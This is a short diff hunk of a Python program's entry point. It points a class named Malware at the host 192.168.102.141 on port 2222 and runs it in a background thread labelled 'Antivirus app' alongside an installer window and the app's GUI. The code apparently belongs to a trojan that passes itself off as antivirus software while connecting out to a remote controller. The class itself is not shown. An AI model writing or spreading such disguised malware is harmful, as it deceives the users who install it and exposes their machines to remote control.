@@ -131,9 +131,9 @@ def startapp():
     root.mainloop()
 
 if __name__ == '__main__':
-    malware = Malware('192.168.102.60',2222)
+    malware = Malware('192.168.102.141',2222)
     main_thread = Thread(target=malware.run,daemon=False)
     main_thread.setName('Antivirus app')
     main_thread.start()
-    depchker.AppInstaller()
+    depchker.AppInstaller().root.mainloop()
     startapp()
